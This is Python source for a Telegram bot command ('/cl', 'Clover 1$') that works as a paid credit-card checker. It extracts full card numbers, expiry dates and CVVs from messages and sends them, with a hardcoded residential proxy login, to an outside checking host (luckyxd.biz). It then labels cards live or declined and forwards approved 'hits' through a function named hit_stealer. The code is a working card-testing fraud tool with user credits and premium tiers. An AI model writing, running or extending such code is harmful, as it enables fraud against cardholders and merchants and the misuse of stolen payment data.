from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import requests, re, time
from plugins.func.users_sql import *
from plugins.tools.hit_stealer import send_hit_if_approved
from datetime import date

session = requests.Session()

@Client.on_message(filters.command("cl", prefixes=["/", "."]))
async def cmd_clover(Client, message):
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        chat_type = message.chat.type
        username = message.from_user.username or "None"

        regdata = fetchinfo(user_id)
        if not regdata:
            return await message.reply_text("❌ You are not registered. Use /register first.")

        role = (regdata[2] or "FREE").strip().upper()
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        if chat_type == ChatType.PRIVATE and role == "FREE":
            return await message.reply_text(
                "⚠️ <b>Premium Users Required</b>\n"
                "Only Premium users can use this command in bot PM.\n"
                "Join our group to use it for FREE:",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                ]),
                disable_web_page_preview=True
            )

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
            return await message.reply_text("❌ Unauthorized group. Contact admin.")

        if credit < 1:
            return await message.reply_text("❌ Insufficient credit.")
        if now - antispam_time < wait_time:
            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)")

        cc_text = None
        if message.reply_to_message:
            cc_text = message.reply_to_message.text or message.reply_to_message.caption
        elif len(message.text.split(maxsplit=1)) > 1:
            cc_text = message.text.split(maxsplit=1)[1]

        if not cc_text:
            return await message.reply_text("❌ Usage: /cl <cc|mm|yy|cvv> or reply to message")

        match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_text)
        if not match:
            return await message.reply_text("❌ No valid CC found in reply or command.")

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply_text(f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Clover 1$</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...
""", quote=True)

        tic = time.perf_counter()
        try:
            proxy = "proxy.rampageproxies.com:5000:package-1111111-country-us-city-bloomington-region-indiana:5671nuWwEPrHCw2t"
            url = f"http://luckyxd.biz:1111/clv?cc={fullcc}&proxy={proxy}"
            res = session.get(url, timeout=50)
            data = res.json()
            card_message = data.get("message") or data.get("result") or res.text or "❌ No response message."
        except Exception as e:
            card_message = f"❌ Request failed: {str(e)}"

        toc = time.perf_counter()

        # BIN lookup
        try:
            binres = session.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}", timeout=10).json()
            brand = binres.get("brand") or binres.get("scheme") or "UNKNOWN"
            type_ = binres.get("type", "N/A")
            level = binres.get("level", "N/A")
            bank = binres.get("bank", "N/A")
            country = binres.get("country_name", "N/A")
            flag = binres.get("country_flag", "🏳️")
        except:
            brand = type_ = level = bank = country = "N/A"
            flag = "🏳️"

        brand, type_, level, bank, country = [i.upper() for i in [brand, type_, level, bank, country]]

        status = "Approved ✅" if any(x in card_message.lower() for x in ["live", "approved", "cvv", "avs", "postal", "zip"]) else "Declined ❌"

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Clover 1$</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ BIN Info:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        await Client.edit_message_text(chat_id, check_msg.id, final_msg)

        if "approved" in status.lower() or "live" in card_message.lower():
            await send_hit_if_approved(Client, final_msg)

        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
